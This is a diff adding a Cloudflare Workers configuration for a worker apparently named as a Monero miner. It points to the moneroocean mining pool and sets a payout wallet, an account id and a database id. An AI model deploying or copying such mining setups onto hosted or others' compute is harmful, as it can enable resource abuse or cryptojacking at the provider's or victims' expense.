@@ -1,0 +1,14 @@
+name = "mining-register-2"
+account_id = "f07be5f84583d0d100b05aeeae56870b"
+main = "gen0_worker_miner.js"
+compatibility_date = "2026-04-30"
+
+[[d1_databases]]
+binding = "DB"
+database_id = "20da851f-2876-4113-bdae-9f99582ea0e2"
+
+[vars]
+WORKER_ID = "mining-register-2"
+POOL_HOST = "gulf.moneroocean.stream"
+POOL_PORT = "10128"
+WALLET = "4AZa4bQHDZRiU6cxpJ3mRtMAjduVAL6s2CFVRarXE9JW3iaQRgjNyBEMBAqVAJbiM9d9hjfhbJLHPKvs3bC6Qk5uT2kCwto"
